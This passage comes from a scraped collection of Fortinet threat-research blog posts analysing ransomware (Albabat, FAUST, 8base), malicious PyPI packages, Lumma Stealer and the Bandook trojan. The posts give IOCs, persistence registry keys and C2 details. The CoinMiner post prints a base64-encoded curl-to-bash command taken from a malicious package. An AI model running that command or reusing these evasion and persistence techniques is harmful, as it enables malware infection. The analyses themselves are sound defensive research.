10, which was added in version 0.3.0. The attacker’s Bitcoin wallet had no transactions at the time of our investigation. Although one of the Albabat ransomware samples instructs victims to visit a TOR site, the site was no longer accessible at the time of our investigation. Since there is no mention of data exfiltration in the ransom notes, it is likely that the TOR site was only used for ransom negotiations. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Albabat ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Albabat Ransomware File IOCs SHA2 e1c399c29b9379f9d1d3f17822d4496fce8a5123f57b33f00150f287740049e9 ce5c3ec17ce277b50771d0604f562fd491582a5a8b05bb35089fe466c67eef54 483e0e32d3be3d2e585463aa7475c8b8ce254900bacfb9a546a5318fff024b74 614a7f4e0044ed93208cbd4a5ab6916695e92ace392bc352415b24fe5b2d535c bfb8247e97f5fd8f9d3ee33832fe29f934a09f91266f01a5fed27a3cc96f8fbb Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Another Phobos Ransomware Variant Launches Attack – FAUST",
    "link": "https://www.fortinet.com/blog/threat-research/phobos-ransomware-variant-launches-attack-faust",
    "content": "FortiGuard Labs Threat Research The Phobos ransomware family is a notorious group of malicious software designed to encrypt files on a victim's computer. It emerged in 2019 and has since been involved in numerous cyber attacks. This ransomware typically appends encrypted files with a unique extension and demands a ransom payment in cryptocurrency for the decryption key. FortiGuard Labs has captured and reported on several ransomware variants from the Phobos family, includingEKINGand8Base. Recently, FortiGuard Labs uncovered an Office document containing a VBA script aimed at propagating the FAUST ransomware, another variant of Phobos. The attackers utilized the Gitea service to store several files encoded in Base64, each carrying a malicious binary. When these files are injected into a system's memory, they initiate a file encryption attack. Figure 1 shows the attack chain. In this blog, we explore the different phases of file deployment and delve into the details of the delivered malware. The XLAM document we discovered contains an embedded VBA script, as illustrated in Figure 2. Upon opening the document, the script triggers PowerShell for the next stage using the “Workbook_Open()” function. It then downloads Base64-encoded data from Gitea, which can be decoded into a clean XLSX file. This file is then saved in the TEMP folder and automatically opened, misleading users into thinking the process is completed and poses no harm. Figure 3 displays the decoded code retrieved from the variable “SkSLjvNc.” The PowerShell script downloads data from hxxps://gitea[.]com/JoinPokingo/JingaPol/raw/branch/main/cfmifs_CRPT[.]txt, extracts the targeted malicious section in “cfmifs_CRPT[.]txt” using the pattern “DICK{(.*)}DICK” and decodes the result from Base64, which is shown in Figure 4. Lastly, a random folder is selected within “$env:APPDATA..\\Local,” and two randomly generated characters are appended to the folder name, giving it a new name. The executable, “AVG update.exe,” is saved in this new folder, as shown in Figure 5. The executable file “AVG update.exe” functions as a downloader. It incorporates an abundance of extraneous code to evade detection and complicate analysis. Employing a process injection technique, it allocates Read-Write-Execute (RWE) memory to inject the malicious code into a newly generated process. Additionally, the file encodes all its strings and XORs them with specific hexadecimal keys before utilization. Figure 6 shows the assembly code for obtaining a DLL name from the encoded string “blogaudit” utilizing XOR hex keys. “blogauditblo” ^ 0x29293d292439575B5A262023 = “KERNEL32.DLL” It encompasses the following functions: The attacker allocates a section within the target process's memory, inserts malicious code, and calls to the payload's entry point. FAUST Ransomware is a variant of the Phobos family, a type of malware that encrypts the files on the victim's computer. It demands a ransom in exchange for providing a decryption key. This ransomware appends the \".faust\" extension to each encrypted file and generates info.txt and info.hta within the directories housing the encrypted files. These files serve as a means to establish contact with the attackers for ransom negotiations. It checks the Mutex object to ensure only one process is running, and it adds persistence by adding a registry to “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run “ and copying itself to two folders: “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” These folders are associated with the Windows startup configuration. The former is user-specific, launching programs at user login, while the latter is system-wide, affecting all users during system startup. They are crucial for automatically running the FAUST Ransomware. To avoid destroying the system, double-encrypting files, or encrypting its ransom information, it contains an exclusion list: Like the typical behavior of Phobos variants, FAUST ransomware keeps the decryption function for configuration. Take the exclusion list, for example. It uses the index 7 for file extensions, 8 for filenames, and 9 for directories. It also initiates multiple threads to perform various tasks. These tasks include deploying encryption, scanning logical drives, searching for network/sharing resources, scanning files individually, and explicitly seeking database-related files (such as fdb, sql, 4dd, 4dl, abs, abx, accdb, accdc, accde, adb, adf, ckp, db, db-journal, db-shm, db-wal, db2, db3, dbc, dbf, dbs, dbt, dbv, dcb, dp1, eco, edb, epim, fcd, gdb, mdb, mdf, ldf, myd, ndf, nwdb, nyf, sqlitedb, sqlite3, and sqlite). The encrypted files carry the extension “.id[<<ID>>-3512].[babylon4367@proton.me].faust.” It also launches the HTML version of the ransom note, “info.hta,” on the victim’s device. Figure 13 shows the message instructing victims to contact the attackers via email, using the specific ID as the message's title, or through a TOX message. By inspecting the TOX ID, we found that the original seller initiated the selling process in November 2023, as shown in Figure 14. Notably, the selling activity is ongoing, and users should remain vigilant against this ongoing threat. This report delved into the FAUST variant of the Phobos ransomware, providing insights into the process of downloading the payload file from an MS Excel document embedded with VBA script. Our analysis uncovered a threat actor employing a fileless attack to deploy shellcode, injecting the final FAUST payload into the victim's system. The FAUST variant exhibits the ability to maintain persistence in an environment and creates multiple threads for efficient execution.

    "title": "Info Stealing Packages Hidden in PyPI",
    "link": "https://www.fortinet.com/blog/threat-research/info-stealing-packages-hidden-in-pypi",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The Python Package Index (PyPI) is an open repository of software packages developed by the Python community to help people quickly develop or update applications. While most of the packages uploaded to PyPI are posted by dedicated individuals looking to support the Python community, threat actors also regularly post packages infected with malware. The FortiGuard Labs team uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor these threats. Recently, we identified a PyPI malware author (who goes by the ID “WS”) discreetly uploading malicious packages to PyPI. We now estimate that there may be well over 2000 victims of “WS” just from the packages described below alone. The identified packages—nigpal, figflix, telerer, seGMM, fbdebug, sGMM, myGens, NewGends, and TestLibs111—exhibit attack methodologies similar to those outlined in a Checkmarxblog postpublished four months ago. The similarity suggests a possible connection to a malicious campaign from early 2023. Notably, these packages incorporate base64-encoded source code of PE or other Python scripts within their setup.py files. Depending on the victim devices’ operating system, the final malicious payload is dropped and executed when these Python packages are installed. A brief timeline of our findings about this info-stealing author is detailed below. The packages released before December 2023 are very similar to those discussed in earlier blog posts. Specifically, they deploy Whitesnake PE malware if the victim’s device runs on Windows, or they can deliver a Python script designed to steal information from Linux devices. A subtle distinction lies in the new method now being used by the Python script to transmit stolen data. Instead of relying on a single fixed URL, these new malware variants use a range of IP addresses as the destination, likely to ensure successful data transmission even if one server fails. Given the strong resemblance of these new packages to the previous ones, we will focus on analyzing the payloads from these more recent variants. Unlike earlier attacks that targeted both Windows and Linux users, this recent set of packages predominantly targets Windows users. While the executable payload for each package varies slightly from one another, they consistently aim to exfiltrate sensitive information from victims. Let’s take a brief look at a few of these payloads. Unlike the previous Whitesnake PE payloads developed using .NET, this sample manifests as a Python-compiled executable crafted using the PyInstaller tool. Upon careful examination of its contents post-extraction, the primary script file is revealed as 'main.pyc' accompanied by an 'addresses.py' counterpart. The mere presence of this counterpart raises suspicions. Upon decompiling 'main.pyc,' we can see that the code is somewhat incomplete, accentuating its clandestine nature. Red flags include copying itself to the Windows startup folder for autorun on startup. The script also probes logical drives, endeavoring to copy itself into non-removable drives. Notably, it adopts a discreet strategy by monitoring the count of its running instances, ensuring an inconspicuous profile complete with an exit strategy if the count surpasses two. Finally, the script retrieves the clipboard contents and compares them against predefined cryptocurrency address patterns. The discovery of matching patterns prompts the script to overwrite the clipboard with corresponding addresses sourced from 'addresses.py.' This could deceive unsuspecting victims into directing things like cryptocurrency transactions to an unexpected destination. This payload is an encrypted .NET executable. Upon being installed on the user’s device, the payload launches an invisible window of “cmd.exe.” It then uses \"powershell.exe\" through this window to add itself to the Windows Defender’s exclusion list to bypass the built-in security response: It then copies itself to the Windows Application folder and creates a scheduled task to run itself every hour once the device is infected: Each time the task runs, it establishes a connection to the malicious IP: 194[.]36[.]177[.]30. It uses “socket.io” to connect the server to the client. This way, if the connection is lost, it will automatically try to reconnect. The core of this payload tries to collect user information, such as the user’s IP address, the host credentials, etc.: The following strings offer more compelling evidence of the information-stealing capabilities of this payload. They reveal that the payload not only captures mouse and keyboard interactions but also acquires and transmits wallet and browser data to the remote server. Once this sample runs, we can observe data being sent to a suspicious IP address (194[.]36[.]177[.]30), as shown in Figure 12. At first glance, we might dismiss these as inconspicuous strings. However, further investigation shows this to be a .zip file shrouded in multiple layers of encryption. This raises serious concerns about its behavior. Upon decryption, we see 'PK' as the initial bytes, indicating a .zip file format. After debugging this sample, there are several indicators as to what sensitive content it may be interested in. Below are a few of the many interesting strings that were found during our analysis. Some of these strings may indicate info-stealing from different services, such as browsers, applications, and cryptocurrency services. Some examples we found included Chrome, Discord, Filezilla, and Coinbase. When we extract the .zip file, we can see some of the collected content. The author then exfiltrates this sensitive information to the server. This blog demonstrates the ability of a single malware author to disseminate numerous info-stealing malware packages into the PyPI library over time, each featuring distinct payload intricacies. Users are urged to exercise utmost caution when using open-source packages, checking for malicious content or payloads that may render targeted devices susceptible to information theft. The narrative of this particular malware author has unfolded over several months and showcases the considerable amount of havoc that has been wrought. Information-stealing malware is an increasingly pertinent and pressing subject.

    "title": "Deceptive Cracked Software Spreads Lumma Variant on YouTube",
    "link": "https://www.fortinet.com/blog/threat-research/lumma-variant-on-youtube",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently discovered a threat group using YouTube channels to distribute a Lumma Stealer variant. We found and reported on a similar attack method via YouTube inMarch 2023. These YouTube videos typically feature content related to cracked applications, presenting users with similar installation guides and incorporating malicious URLs often shortened using services like TinyURL and Cuttly. To circumvent straightforward web filter blacklists, the attackers exploit open-source platforms like GitHub and MediaFire instead of deploying their malicious servers. In this case, the shared links lead to the direct download of a new private .NET loader responsible for fetching the final malware, Lumma Stealer. Lumma Stealer targets sensitive information, including user credentials, system details, browser data, and extensions. It has been advertised on the dark web and a Telegram channel since 2022, with over a dozen observed command-and-control (C2) servers in the wild and multiple updates. Figure 1 shows Lumma Stealer's C2 server telemetry, illustrating a global presence with a peak observed in December. In this article, we will elaborate on each stage's behaviors that facilitated the stealer's distribution. The hacker initially breaches a YouTuber's account and uploads videos masquerading as sharing cracked software. Figure 3 shows the video descriptions in which a malicious URL is embedded, enticing users to download a ZIP file that harbors malicious content for the next stage of the attack. The videos were uploaded earlier this year, but the files on the file-sharing site receive regular updates (Figure 4), and the number of downloads keeps growing. This indicates that the ZIP file is always new and that this method effectively spreads malware. The ZIP file, “installer_Full_Version_V.1f2.zip,” contains an LNK file that calls PowerShell to download a .NET execution file via the GitHub repository “New” owned by John1323456 (Figure 6). The abbreviated URL, “hxxp://cutt[.]ly/lwD7B7lp,” connects to “hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6[.]exe.” The other two repositories, “LNK” and “LNK-Ex,” also include NET loaders and spread InfoStealer as the final payload. The private .NET loader is obfuscated with SmartAssembly. It first gets the system’s environment value, shown in Figure 7. Once the number of the data is correct, it proceeds to load the PowerShell script. Otherwise, it exits the program. Figure 8 shows the construction of a dictionary that defines the following properties of the ProcessStartInfo object that the malicious code uses to execute discreetly and avoid raising suspicion from its victims: Next, the ProcessStartInfo object is employed to launch the PowerShell process, wherein the PowerShell script is directed to the process's standard input. Figure 9 illustrates a portion of the code and the newly generated process. Figure 10 shows the partial PowerShell code from the private .NET loader. The script encodes the server IP address in Base64 and encompasses four servers. It assesses the system date, choosing the appropriate IP to retrieve encrypted binary data. To obfuscate analysis, the script incorporates a substantial amount of extraneous code. Figure 11 shows captured traffic downloaded from the first server, 176[.]113[.]115[.]224:29983. After receiving the data, the script decrypts it using AES CBC, followed by GZip decompression to obtain the DLL file for the next stage. It then invokes the DLL file with a specific method and type via “[System.Reflection.Assembly]::Load(),” as shown in Figure 12. Figure 13 shows the targeted function “PerkyRiggal,” which is pivotal in inspecting the system and environment. It employs several PNG files in the Resources section to decipher the ultimate payload of Lumma Stealer. To avoid detection, the file encodes all its strings using the \"BygoLarchen\" method. Figure 14 demonstrates the function of decoding the target text with a predefined key string. It checks the following items to achieve Anti-VM and Anti-Debug: After completing all environment checks, the program decrypts the resource data and invokes the \"SuspendThread\" function. This function is employed to transition the thread into a \"suspended\" state, a crucial step in the process of payload injection (see Figure 15). Lumma stealer is a type of malware that can steal sensitive information from a user’s computer. It can target the system data, the browsers, crypto wallets, and browser extensions. It is written in C language and sold on underground forums. To elude detection and analysis, it employs diverse obfuscation techniques. The malware establishes communication with a command and control server, facilitating the exchange of instructions and transmitting pilfered data. Figure 16 shows the method to contact a command and control (C2) server. Once it gets the first server that can set up a connection, it then sends out a POST message with hardcoded User-Agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36“ and parameter “act=life” to check-in. The corresponding code is shown in Figure 17. Next, it sends a POST request with the Lumma ID and “act=receive-message,” shown in Figure 18. Then, the compressed stolen data is uploaded to the C2 server with URI “/api.” Although the version is still “4.0,” Lumma Stealer has recently updated its exfiltration to leverage HTTPS to better evade detection. In this attack, the malicious actor targets YouTube channels to disseminate Lumma Stealer. The crafted installation ZIP file serves as an effective bait to deliver the payload, exploiting the user's intention to install the application and prompting them to click the installation file without hesitation. URLs from open-source websites throughout the scheme aim to diminish user awareness. The attackers further deploy a private .NET loader with environment checks, various anti-virtual machine (Anti-VM), and anti-debugging functions. Users must exercise caution regarding unclear application sources and ensure legitimate applications from reputable and secure origins are used.

    "title": "Three New Malicious PyPI Packages Deploy CoinMiner on Linux Devices",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-pypi-packages-deploy-coinminer-on-linux-devices",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxAffected parties:Linux users that have these malicious packages installedImpact:Latency in device performanceSeverity level:High On December 5th, 2023, FortiGuard's AI-driven OSS malware detection system identified three intriguing PyPI (Python Package Index) packages. These packages, upon initial use, deploy a CoinMiner executable on Linux devices. Leveraging our historical malware database, we noted that the indicators of compromise (IoCs) for these packages bear a resemblance to the \"culturestreak\" PyPI package discovered earlier this September. A comprehensive overview of the attack pattern of \"culturestreak\" was previously detailed in a Checkmarxblog post. In this analysis, we cover the attack phases of these three new packages, focusing on their similarities and developments compared to \"culturestreak.\" These three harmful packages are named modularseven-1.0, driftme-1.0, and catme-1.0. They all originate from the same author, known as \"sastra\", who created a PyPI account shortly before uploading the first of these malicious packages. These packages all exhibit a common attack methodology, so we will use driftme-1.0 as an example to illustrate the stages of the attack. Echoing the approach of the earlier \"culturestreak\" package, these packages conceal their payload, effectively reducing the detectability of their malicious code by hosting it on a remote URL. The payload is then incrementally released in various stages to execute its malicious activities. The malicious activity is triggered by the “import” statement in the __init__.py file: The processor.py module contains thefirst stageof the malicious payload: By calling the processing() function, it decodes the string Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC91bm1pLnNoIHwgYmFzaA== into a shell command that fetches the content from the specified URL using curl. It then pipes that content directly to the Bash shell, which executes the following script: Looking into the “unmi.sh” script, we found that it contains thesecond stageof the malicious payload: Utilizing the “unmi.sh” script, the attacker downloads two critical items onto the user’s device: The first is “config.json,” a configuration file required for executing the program that will be installed. This file outlines the cryptocurrency mining setting. Specifically, it determines the mining algorithm, i.e., randomX, the device resource settings for mining operations, and the designated mining \"pools,\" along with the beneficiary’s wallet account. Notably, the attacker has chosen to disable the \"init-avx2\" feature, presumably to ensure compatibility with older devices. The second key component of the payload is the CoinMiner executable: Similar to the configuration file, this executable is also hosted at a remote address: hxxps://gitlab.com/ajo9082734/Mine/-/raw/main/X Once the executable is downloaded from the remote URL and marked as executable, the attacker employs the “nohup” command to execute it in the background. This ensures the process remains active beyond the terminal session. The most deceptive aspect is that the attacker ensures that all these modifications are appended to the ~/.bashrc file, ensuring the reactivation of this malicious activity whenever the user initiates a new Bash shell session. The coinMiner ELF file, retrieved during this process, is not new to the security community. It was initially uploaded to VirusTotal (VT) in 2021. Currently, a significant number of vendors on VT recognize the payload as malicious. The three packages discussed in this blog have IoCs similar to “culturestreak”: These three packages, when compared to \"culturestreak,\" showcase enhanced strategies in both concealing their presence and maintaining their malicious functions. A key enhancement is the introduction of an extra stage, where crucial commands for the malicious operations are stored in the “unmi.sh” file on a remote server. This tactic improves the odds of evading detection by security solutions by minimizing the code within the PyPI package. It also allows for more controlled disclosure of the malicious code by simply disabling the server hosting this “unmi.sh” script. Moreover, this malware inserts the malicious commands into the ~/.bashrc file. This addition ensures the malware's persistence and reactivation on the user's device, effectively extending the duration of its covert operation. This strategy aids in the prolonged, stealthy exploitation of the user's device for the attacker's benefit. A notable trend we observed from this particular set of packages is that malicious actors continuously refine their strategies to conceal and lengthen the exploitation process. An essential tactic discussed in this blog involves breaking down the entire malicious workflow into smaller stages and releasing them incrementally. For the security community, the ability to detect subtle malicious indicators becomes crucial. Furthermore, this serves as a reminder of the critical importance of thoroughly scrutinizing code and packages sourced from unverified or suspicious origins and staying well-informed about potential threats.

    "title": "Ransomware Roundup - 8base",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-8base",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the 8base ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High 8base is a financially motivated ransomware variant most likely based on the Phobos ransomware. Per our FortiRecon information, the 8base ransomware first appeared in May 2023. FortiGuard Labs has observed SmokeLoader variants delivering the 8base ransomware. Such SmokeLoader samples include bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 and ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc. The 8base ransomware may also rely on other distribution methods. According to data collected through Fortinet'sFortiRecon service, the 8base ransomware has targeted multiple industry verticals (Figure 2). The ransomware most impacted business services, followed by the manufacturing and construction sectors. When victim organizations are ranked according to country (Figure 3), the United States leads by a wide margin. Once the ransomware is executed, it looks for files to encrypt. It skips files if the filename contains one of the following strings: info.hta (ransom note) info.txt (ransom note) boot.ini bootfont.bin ntldr ntdetect.com io.sys recov It also avoids the following folders: The ransomware avoids encrypting files inside the Caches folder, most likely because doing so may lead to software problems. It also tries to kill the following processes before encrypting files: msftesql.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe mydesktopqos.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe agntsvc.exe agntsvc.exe agntsvc.exe encsvc.exe firefoxconfig.exe tbirdconfig.exe ocomm.exe mysqld.exe mysqld-nt.exe mysqld-opt.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe Killing these processes ensures that any files open in them, such as MS Office files, will be closed so the ransomware can encrypt them. The 8base ransomware also checks for file size, with a threshold set at 1.5MB. The ransomware fully encrypts files smaller than 1.5MB. On the other hand, it partially encrypts files larger than 1.5MB, most likely to increase the encryption speed. The encryption speed is often a subject of competition among ransomware developers because they want to encrypt as many files as possible before the victim becomes aware of the infection. To elaborate a bit, the ransomware injects blocks comprised of 0x40000 null bytes into various parts of the final output/encrypted file, starting at the beginning of the file. It also encrypts the last 0xC0000 bytes (with additional encrypted metadata) and may leave other parts of the file unencrypted. The ransomware then uses AES to encrypt any target files discovered and adds a file extension that includes the attacker’s contact email address “.id[unique ID assigned to the victim].[removed@rexsdata.pro].8base”. In the middle of November 2023, we came across a different version of the 8base ransomware (SHA2: 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f). This variant is written in C instead of the .NET used in older variants. This recent 8base ransomware variant excludes the same files and folders from file encryption, but after encrypting files, it displays a significantly longer ransom note than the one used in the .NET variants. The ransom note includes a contact email address and a TOR data leak site address not included in previous ransom notes. It also adds a new file extension to the files it encrypts, “.id[unique ID assigned to the victim].[recovery8files@(removed).org].8base”. The 8base ransomware group owns a TOR site where victims can contact the threat actor. The stolen information was released through various file storage/sharing services such as Gofile, Pixeldrain, files.dp.ua, AnonFiles, Anonym File, and Mega. The 8base ransomware TOR site includes a victim list, contact form, FAQ, and terms of service. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the 8base ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "title": "Bandook - A Persistent Threat That Keeps Evolving",
    "link": "https://www.fortinet.com/blog/threat-research/bandook-persistent-threat-that-keeps-evolving",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication. The injector component decrypts the payload in the resource table and injects it into msinfo32.exe. Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1. A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new variant uses less control code and makes a more precise division of tasks. Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers. The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy. These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce). Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism. When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe. Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\WinlogonKey name: shellValue: explorer.exe, %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Key name: LoadValue: short path of %APPDATA%\\SMC\\SMC.exe When the copy is SMC.cpl, the registry key and value are the following: Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %windir%\\System32\\controll.exe %APPDATA%\\SMC\\SMC.cpl When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions. An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it. First, Bandook sends victim information to its C2 server: If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll. Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants. These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware. The data from the C2 server has the following format: {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~! The first argument is the command, which is necessary. Arg2 to Arg6 are optional. Below are four examples of actions that require multiple 